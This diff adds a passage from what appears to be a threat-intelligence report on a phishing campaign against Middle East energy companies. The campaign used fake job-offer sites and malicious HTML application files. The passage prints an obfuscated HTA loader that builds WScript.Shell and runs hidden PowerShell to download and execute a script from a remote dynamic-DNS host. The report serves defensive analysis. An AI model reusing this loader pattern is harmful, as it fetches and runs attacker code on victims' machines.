@@ -1,0 +1,21 @@
+
+أَبِي لَهَبٍ وَتَبَّ.
+This is a phrase from the Quran (Surah Masad, Ayat 1 [111:1]) that means “perish the hands of the Father of flame” or “the power of Abu Lahab will perish, and he will perish.”
+What does this mean in the context of a cyber campaign targeting energy industries in the Middle East?
+Overview of the attack How did the malware get onto the victim’s network?
+We received intelligence that the adversaries had created websites closely resembling legitimate domains which carry job offerings.
+For example: Hxxp://possibletarget.ddns.com:880/JobOffering.
+Many of the URLs we discovered were related to the energy sector operating mostly in the Middle East.
+Some of these sites contained malicious HTML application files that execute other payloads.
+Other sites lured victims to login using their corporate credentials.
+This preliminary attack seems to have started by the end of August 2018, according to our telemetry, to gather these credentials.
+A code example from one malicious HTML application file: YjDrMeQhBOsJZ =
+“WS”
+wcpRKUHoZNcZpzPzhnJw =
+“crip” RulsTzxTrzYD = “t.Sh” MPETWYrrRvxsCx =
+“ell” PCaETQQJwQXVJ =
+(YjDrMeQhBOsJZ + wcpRKUHoZNcZpzPzhnJw + RulsTzxTrzYD + MPETWYrrRvxsCx) OoOVRmsXUQhNqZJTPOlkymqzsA=new ActiveXObject(PCaETQQJwQXVJ)
+ULRXZmHsCORQNoLHPxW = “cm” zhKokjoiBdFhTLiGUQD =
+“d.e” KoORGlpnUicmMHtWdpkRwmXeQN = “xe” KoORGlpnUicmMHtWdp = “.”
+KoORGlicmMHtWdp = “(‘http://mynetwork.ddns.net:880/*****.ps1’) OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\\\System32\\\\’ + FKeRGlzVvDMH + ‘ /c
+powershell -w 1 IEX (New-Object Net.WebClient)’+KoORGlpnUicmMHtWdp+’downloadstring’+KoORGlicmMHtWdp) OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\\\System32\\\\’ + FKeRGlzVvDMH + ‘ /c powershell -window hidden -enc
